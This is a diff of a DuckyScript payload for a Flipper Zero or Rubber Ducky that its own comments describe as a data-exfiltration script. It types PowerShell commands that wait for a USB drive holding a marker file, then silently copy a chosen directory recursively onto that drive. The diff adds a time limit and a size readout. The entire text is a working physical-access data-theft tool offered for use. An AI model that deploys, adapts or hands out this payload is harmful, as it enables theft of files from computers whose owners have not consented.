@@ -17,50 +17,63 @@ REM This script tests all removable drive root directories for a certain file wi
 REM IF this file is detected, this means this drive is the removable you're using to exfill data to.
 REM How to use this script?
 REM Copy this Ducky script to your Flipper Zero or Rubber Ducky, generate a file with a random file name
-REM and change the value of $CopyFrom, $CopyTo and $FindMe below accordingly.
+REM and change the value of $MaxDuration, $CopyFrom, $CopyTo and $FindMe below accordingly.
 
 DELAY 1000
 GUI r
 DELAY 1000
-ALTSTRING powershell
+STRING powershell
 ENTER
 DELAY 2000
+STRING $MaxDuration = 180
 ENTER
-ALTSTRING $CopyFrom = "C:\Windows"
+ALTCODE $CopyFrom = "C:\Windows"
 ENTER
-ALTSTRING $CopyTo = "copy"
+ALTCODE $CopyTo = "copy"
 ENTER
-ALTSTRING $FindMe = "gfhnubkw.txt"
+ALTCODE $FindMe = "gfhnubkw.txt"
 ENTER
-ALTSTRING $f = $false
+STRING $f = $false
 ENTER
-ALTSTRING Cls
+STRING $startTime = Get-Date
 ENTER
-ALTSTRING while (-not $f) {
+STRING while ((New-TimeSpan -Start $startTime).TotalSeconds -lt $MaxDuration -and -not $f) {
 ENTER
-ALTSTRING $d = Get-WmiObject -Class Win32_Volume | Where-Object { $_.DriveType -eq 2 }
+STRING $d = Get-WmiObject -Class Win32_Volume | Where-Object { $_.DriveType -eq 2 }
 ENTER
-ALTSTRING foreach ($e in $d) {
+STRING foreach ($e in $d) {
 ENTER
-ALTSTRING $p = Join-Path -Path $e.Name -ChildPath $FindMe
+STRING $p = Join-Path -Path $e.Name -ChildPath $FindMe
 ENTER
-ALTSTRING if (Test-Path $p) {
+STRING if (Test-Path $p) {
 ENTER
-ALTSTRING $f = $true
+STRING $f = $true
 ENTER
-ALTSTRING Write-Host "Copying..."
+STRING $partition = Get-Partition | Where-Object { $_.DriveLetter -eq $e.DriveLetter }
 ENTER
-ALTSTRING $Destination = "$($e.Name)\$CopyTo"
+STRING $totalSize = 0
 ENTER
-ALTSTRING Copy-Item -Path $CopyFrom -Destination $Destination -Recurse -ErrorAction SilentlyContinue ; Exit
+STRING $files = Get-ChildItem $CopyFrom -File -Recurse -ErrorAction SilentlyContinue
 ENTER
-ALTSTRING }
+STRING foreach ($file in $files) {
 ENTER
-ALTSTRING break
+STRING $totalSize += $file.Length}
 ENTER
-ALTSTRING }
+STRING if ($totalSize -lt 1GB) {
 ENTER
-ALTSTRING }
+ALTCODE $totalSizeFormatted = "$([Math]::Round($totalSize / 1MB, 1)) MB"}
 ENTER
-ALTSTRING Exit
+STRING else {
+ENTER
+ALTCODE $totalSizeFormatted = "$([Math]::Round($totalSize / 1GB, 1)) GB"}
+ENTER
+ALTCODE Write-Host "Copying... $totalSizeFormatted to $($e.DriveLetter)"
+ENTER
+ALTCODE $Destination = "$($e.Name)\$CopyTo"
+ENTER
+STRING Copy-Item -Path $CopyFrom -Destination $Destination -Recurse -ErrorAction SilentlyContinue
+ENTER
+STRING Exit}
+ENTER
+STRING break}}
 ENTER
